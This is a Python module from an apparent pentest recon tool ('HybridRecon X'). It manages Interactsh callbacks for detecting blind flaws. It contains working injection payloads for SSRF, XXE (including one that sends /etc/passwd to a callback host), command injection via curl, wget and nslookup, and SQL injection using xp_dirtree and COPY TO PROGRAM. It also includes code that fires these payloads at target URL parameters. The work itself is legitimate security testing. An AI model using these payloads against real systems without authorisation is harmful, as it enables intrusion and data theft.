#!/usr/bin/env python3
"""
============================================================================
LIB: OOB HANDLER (Out-of-Band Testing)
============================================================================
Manages out-of-band testing using Interactsh for detecting blind 
vulnerabilities (SSRF, XXE, RCE, SQLi).
============================================================================
"""

import json
import time
import uuid
import base64
import hashlib
import threading
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Set, Callable
from datetime import datetime
from queue import Queue

try:
    import requests
except ImportError:
    print("Error: requests library required")
    import sys
    sys.exit(1)


@dataclass
class OOBPayload:
    """An out-of-band test payload."""
    id: str                    # Unique identifier
    url: str                   # Target URL being tested
    param: str                 # Parameter being tested
    vuln_type: str             # ssrf, xxe, rce, sqli, etc.
    payload: str               # The actual payload sent
    callback_url: str          # Full callback URL
    created_at: float = field(default_factory=time.time)
    triggered: bool = False
    trigger_time: Optional[float] = None
    trigger_data: Dict = field(default_factory=dict)


@dataclass
class OOBCallback:
    """A received callback from Interactsh."""
    payload_id: str
    protocol: str              # dns, http, smtp, etc.
    source_ip: str
    timestamp: float
    raw_data: Dict


class InteractshClient:
    """
    Client for Interactsh out-of-band testing.
    
    Supports:
    - Generating unique callback URLs
    - Polling for interactions
    - Correlating callbacks to payloads
    """
    
    DEFAULT_SERVERS = [
        "oast.fun",
        "oast.live", 
        "oast.site",
        "oast.online",
        "oast.me",
    ]
    
    def __init__(self, server: str = None, custom_server: str = None):
        self.server = custom_server or server or self.DEFAULT_SERVERS[0]
        self.session_id = self._generate_session_id()
        self.payloads: Dict[str, OOBPayload] = {}
        self.callbacks: List[OOBCallback] = []
        self.polling = False
        self._poll_thread: Optional[threading.Thread] = None
        self._callback_handlers: List[Callable] = []
        
    def _generate_session_id(self) -> str:
        """Generate a unique session identifier."""
        return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:12]
    
    def generate_payload_id(self) -> str:
        """Generate a unique payload identifier."""
        return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:8]
    
    def get_callback_url(self, payload_id: str = None) -> str:
        """
        Generate a callback URL for testing.
        
        Returns URL like: payload_id.session_id.server
        """
        if not payload_id:
            payload_id = self.generate_payload_id()
        
        return f"{payload_id}.{self.session_id}.{self.server}"
    
    def get_callback_url_http(self, payload_id: str = None) -> str:
        """Get HTTP callback URL."""
        base = self.get_callback_url(payload_id)
        return f"http://{base}"
    
    def get_callback_url_https(self, payload_id: str = None) -> str:
        """Get HTTPS callback URL."""
        base = self.get_callback_url(payload_id)
        return f"https://{base}"
    
    def register_payload(
        self, 
        url: str, 
        param: str, 
        vuln_type: str,
        payload: str
    ) -> OOBPayload:
        """Register a new OOB test payload."""
        payload_id = self.generate_payload_id()
        callback_url = self.get_callback_url(payload_id)
        
        oob_payload = OOBPayload(
            id=payload_id,
            url=url,
            param=param,
            vuln_type=vuln_type,
            payload=payload,
            callback_url=callback_url,
        )
        
        self.payloads[payload_id] = oob_payload
        return oob_payload
    
    def poll_interactions(self, timeout: int = 5) -> List[OOBCallback]:
        """
        Poll Interactsh server for interactions.
        
        Note: This is a simplified implementation. The full Interactsh
        protocol uses encrypted communication. For production, use the
        official interactsh-client or implement the full protocol.
        """
        # For self-hosted or compatible servers
        poll_url = f"https://{self.server}/poll?id={self.session_id}"
        
        try:
            resp = requests.get(poll_url, timeout=timeout, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                new_callbacks = []
                
                for interaction in data.get('data', []):
                    callback = self._parse_interaction(interaction)
                    if callback:
                        new_callbacks.append(callback)
                        self._process_callback(callback)
                
                return new_callbacks
        except Exception as e:
            # Polling failed - server might not support direct polling
            pass
        
        return []
    
    def _parse_interaction(self, data: Dict) -> Optional[OOBCallback]:
        """Parse an interaction from Interactsh."""
        try:
            # Extract payload ID from subdomain
            full_id = data.get('full-id', '')
            parts = full_id.split('.')
            
            if len(parts) >= 2:
                payload_id = parts[0]
                
                return OOBCallback(
                    payload_id=payload_id,
                    protocol=data.get('protocol', 'unknown'),
                    source_ip=data.get('remote-address', ''),
                    timestamp=time.time(),
                    raw_data=data,
                )
        except:
            pass
        return None
    
    def _process_callback(self, callback: OOBCallback):
        """Process a received callback."""
        self.callbacks.append(callback)
        
        # Mark corresponding payload as triggered
        if callback.payload_id in self.payloads:
            payload = self.payloads[callback.payload_id]
            payload.triggered = True
            payload.trigger_time = callback.timestamp
            payload.trigger_data = callback.raw_data
            
            # Notify handlers
            for handler in self._callback_handlers:
                try:
                    handler(payload, callback)
                except:
                    pass
    
    def add_callback_handler(self, handler: Callable):
        """Add a callback handler function."""
        self._callback_handlers.append(handler)
    
    def start_polling(self, interval: int = 30, duration: int = 300):
        """Start background polling for callbacks."""
        if self.polling:
            return
        
        self.polling = True
        
        def poll_loop():
            start = time.time()
            while self.polling and (time.time() - start) < duration:
                self.poll_interactions()
                time.sleep(interval)
        
        self._poll_thread = threading.Thread(target=poll_loop, daemon=True)
        self._poll_thread.start()
    
    def stop_polling(self):
        """Stop background polling."""
        self.polling = False
    
    def get_triggered_payloads(self) -> List[OOBPayload]:
        """Get all payloads that received callbacks."""
        return [p for p in self.payloads.values() if p.triggered]
    
    def get_results_summary(self) -> Dict:
        """Get summary of OOB testing results."""
        triggered = self.get_triggered_payloads()
        
        by_type = {}
        for p in triggered:
            by_type[p.vuln_type] = by_type.get(p.vuln_type, 0) + 1
        
        return {
            'total_payloads': len(self.payloads),
            'triggered': len(triggered),
            'by_vuln_type': by_type,
            'callbacks': len(self.callbacks),
        }


class OOBPayloadGenerator:
    """Generates OOB payloads for different vulnerability types."""
    
    def __init__(self, client: InteractshClient):
        self.client = client
    
    def ssrf_payloads(self, payload_id: str = None) -> List[str]:
        """Generate SSRF payloads with callback URLs."""
        if not payload_id:
            payload_id = self.client.generate_payload_id()
        
        base_url = self.client.get_callback_url(payload_id)
        
        return [
            f"http://{base_url}",
            f"https://{base_url}",
            f"http://{base_url}/",
            f"//{base_url}",
            # DNS-only (when HTTP is blocked)
            f"http://test.{base_url}",
            # With port
            f"http://{base_url}:80",
            f"http://{base_url}:443",
            # URL encoded
            f"http://{base_url.replace('.', '%2e')}",
            # Various URL schemes
            f"gopher://{base_url}:80/_GET%20/",
        ]
    
    def xxe_payloads(self, payload_id: str = None) -> List[str]:
        """Generate XXE payloads with callback URLs."""
        if not payload_id:
            payload_id = self.client.generate_payload_id()
        
        base_url = self.client.get_callback_url(payload_id)
        
        return [
            # Basic XXE with HTTP callback
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{base_url}">]>
<foo>&xxe;</foo>''',
            
            # XXE with parameter entity
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{base_url}">%xxe;]>
<foo>test</foo>''',
            
            # Blind XXE
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{base_url}/?p=%file;'>">
%eval;%exfil;
]>''',
        ]
    
    def cmdi_payloads(self, payload_id: str = None) -> List[str]:
        """Generate command injection payloads with callbacks."""
        if not payload_id:
            payload_id = self.client.generate_payload_id()
        
        base_url = self.client.get_callback_url(payload_id)
        
        return [
            # curl-based
            f"; curl http://{base_url}",
            f"| curl http://{base_url}",
            f"`curl http://{base_url}`",
            f"$(curl http://{base_url})",
            
            # wget-based
            f"; wget http://{base_url}",
            f"| wget http://{base_url}",
            
            # nslookup (DNS-only)
            f"; nslookup {base_url}",
            f"| nslookup {base_url}",
            f"`nslookup {base_url}`",
            
            # ping (ICMP - if DNS works)
            f"; ping -c 1 {base_url}",
        ]
    
    def sqli_oob_payloads(self, payload_id: str = None) -> List[str]:
        """Generate SQLi OOB payloads (database-specific)."""
        if not payload_id:
            payload_id = self.client.generate_payload_id()
        
        base_url = self.client.get_callback_url(payload_id)
        
        return [
            # MySQL - DNS exfil via LOAD_FILE
            f"' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT 'x'), '.{base_url}\\\\a'))--",
            
            # PostgreSQL - DNS via extensions
            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {base_url}'--",
            
            # MSSQL - DNS via xp_dirtree
            f"'; EXEC master..xp_dirtree '//{base_url}/a'--",
            f"'; EXEC master..xp_subdirs '//{base_url}/a'--",
            
            # Oracle - DNS via UTL_HTTP
            f"'||(SELECT UTL_HTTP.REQUEST('http://{base_url}') FROM DUAL)||'",
        ]


class OOBTestingManager:
    """Manages the full OOB testing workflow."""
    
    def __init__(self, output_dir: str, server: str = None):
        self.output_dir = Path(output_dir)
        self.client = InteractshClient(server=server)
        self.generator = OOBPayloadGenerator(self.client)
        self.findings: List[Dict] = []
        
    def test_ssrf(self, url: str, param: str, session: requests.Session) -> Optional[OOBPayload]:
        """Test a URL/param for SSRF using OOB callbacks."""
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        payload_id = self.client.generate_payload_id()
        payloads = self.generator.ssrf_payloads(payload_id)
        
        for payload in payloads[:3]:  # Limit attempts
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            # Register the payload
            oob = self.client.register_payload(
                url=url,
                param=param,
                vuln_type='ssrf',
                payload=payload,
            )
            
            try:
                session.get(test_url, timeout=10, verify=False)
            except:
                pass
        
        return oob
    
    def test_cmdi(self, url: str, param: str, session: requests.Session) -> Optional[OOBPayload]:
        """Test for command injection using OOB callbacks."""
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        payload_id = self.client.generate_payload_id()
        payloads = self.generator.cmdi_payloads(payload_id)
        
        for payload in payloads[:3]:
            test_params = {k: v[0] for k, v in params.items()}
            original = test_params.get(param, '')
            test_params[param] = original + payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            oob = self.client.register_payload(
                url=url,
                param=param,
                vuln_type='cmdi',
                payload=payload,
            )
            
            try:
                session.get(test_url, timeout=10, verify=False)
            except:
                pass
        
        return oob
    
    def save_results(self):
        """Save OOB testing results."""
        vuln_dir = self.output_dir / 'vulns'
        vuln_dir.mkdir(exist_ok=True)
        
        triggered = self.client.get_triggered_payloads()
        
        if triggered:
            # Save all triggered payloads
            with open(vuln_dir / 'oob_findings.json', 'w') as f:
                json.dump([asdict(p) for p in triggered], f, indent=2)
            
            # Save summary
            summary = self.client.get_results_summary()
            with open(vuln_dir / 'oob_summary.json', 'w') as f:
                json.dump(summary, f, indent=2)
            
            print(f"\n[!] OOB Testing found {len(triggered)} blind vulnerabilities!")
            for p in triggered:
                print(f"    [{p.vuln_type.upper()}] {p.url}")
                print(f"        Param: {p.param}")
                print(f"        Payload: {p.payload[:60]}...")
        else:
            print("\n[*] No OOB callbacks received (this doesn't mean targets are safe)")
    
    def print_instructions(self):
        """Print usage instructions."""
        print("\n" + "="*60)
        print("  OOB TESTING SETUP")
        print("="*60)
        print(f"""
To use OOB testing effectively:

1. The callback URL base is: {self.client.session_id}.{self.client.server}

2. Manual testing:
   - Use payloads like: http://yourtest.{self.client.session_id}.{self.client.server}
   
3. Check for callbacks at:
   - https://{self.client.server} (if using public Interactsh)
   - Or poll: GET https://{self.client.server}/poll?id={self.client.session_id}

4. For best results, run your own Interactsh server:
   - Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
   - Run: interactsh-server
""")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='HybridRecon X - OOB Handler')
    parser.add_argument('--output', '-o', required=True, help='Output directory')
    parser.add_argument('--server', '-s', default='oast.fun', help='Interactsh server')
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("  OUT-OF-BAND TESTING HANDLER")
    print("="*60 + "\n")
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    manager = OOBTestingManager(args.output, server=args.server)
    manager.print_instructions()
    
    # Generate example payloads
    print("\n[+] Example Payloads Generated:")
    print("\nSSRF:")
    for p in manager.generator.ssrf_payloads()[:3]:
        print(f"  {p}")
    
    print("\nCommand Injection:")
    for p in manager.generator.cmdi_payloads()[:3]:
        print(f"  {p}")
    
    print("\n[+] OOB Handler initialized")
    print(f"    Session: {manager.client.session_id}")
    print(f"    Server: {manager.client.server}\n")


if __name__ == '__main__':
    main()
